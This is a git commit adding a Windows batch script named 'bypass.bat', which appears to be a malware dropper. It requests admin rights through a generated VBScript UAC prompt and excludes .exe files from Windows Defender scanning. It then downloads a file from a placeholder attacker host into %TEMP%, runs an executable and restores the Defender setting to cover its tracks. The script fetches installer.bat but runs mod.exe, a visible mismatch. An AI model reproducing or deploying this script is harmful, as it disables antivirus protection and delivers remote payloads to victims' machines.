290cb2c4f321f8716062e825f0c5542f14c7dc21
wnet <wnetmc@gmail.com>
2022-12-05 14:33:19 -0500

    Create bypass.bat

---
+++ bypass.bat
@@ -0,0 +1,33 @@
+REM - This is not the file you need to run. You need to upload this file to your webserver.
+
+@echo off
+
+:: BatchGotAdmin
+:-------------------------------------
+REM  --> Check for permissions
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+
+REM --> If error flag set, we do not have admin.
+if '%errorlevel%' NEQ '0' (
+    echo Requesting administrative privileges...
+    goto UACPrompt
+) else ( goto gotAdmin )
+
+:UACPrompt
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    set params = %*:"=""
+    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
+
+    "%temp%\getadmin.vbs"
+    del "%temp%\getadmin.vbs"
+    exit /B
+
+:gotAdmin
+    pushd "%CD%"
+    CD /D "%~dp0"
+:--------------------------------------
+Powershell -Command "Set-MpPreference -ExclusionExtension exe"
+cd %TEMP%
+Powershell -Command "Invoke-Webrequest 'https://YOURSITE.COM/installer.bat' -OutFile installer.bat"
+mod.exe
+Powershell -Command "Remove-MpPreference -ExclusionExtension exe"
